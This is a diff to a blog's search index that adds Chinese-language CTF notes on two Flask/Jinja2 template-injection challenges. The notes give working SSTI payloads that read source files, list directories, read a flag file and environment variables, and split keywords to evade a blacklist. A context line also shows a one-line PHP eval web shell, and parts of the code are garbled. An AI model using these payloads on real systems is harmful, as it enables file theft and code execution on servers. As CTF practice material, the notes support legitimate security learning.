@@ -954,4 +954,37 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 <p><img src="/2023/01/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%5C333.jpg" alt="lll"></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>做题笔记</title>
+    <url>/2023/01/04/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>111111111111[GYCTF2020]FlaskApp</p>
+<p>1.在解码中发现开的debug</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">Open an interactive python shell <span class="keyword">in</span> this frame        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure>
+
+<p>源代码名称为app.py</p>
+<p>2.读源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in[].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif%&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>): </span><br><span class="line">  black_list = [ &amp;</span><br><span class="line">    <span class="comment">#34;flag&amp;# 34;, &amp; #34;os&amp;# 34;, &amp; #34;system&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;popen&amp;# 34;, &amp; #34;import&amp;# 34;, &amp; #34;eval&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;chr&amp;# 34;, &amp; #34;request&amp;# 34;, &amp; #34;subprocess&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;commands&amp;# 34;, &amp; #34;socket&amp;# 34;, &amp; #34;hex&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;base64&amp;# 34;, &amp; #34;*&amp;# 34;, &amp; #34;?&amp;# 34;</span></span><br><span class="line">]</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> black_list: </span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower(): </span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>@ app.route( &amp;<span class="comment">#39;/hint&amp;# 39;, methods = [ &amp; #39;GET&amp;# 39;])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用catch_warnings的os方法获取文件名称</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in[].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif%&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现在this_is_the_flag.txt文件里</p>
+<p>读取this_is_the_flag.txt即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>222222222222222[Flask]SSTI</p>
+<p>get[name]传参，存在ssti，{2*2}可以运行，是jinja模板</p>
+<p>直接使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in[].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).open(&#x27;env&#x27;).read()&#125;&#125;&#123;% endif%&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打印环境变量直接出</p>
+]]></content>
+  </entry>
 </search>
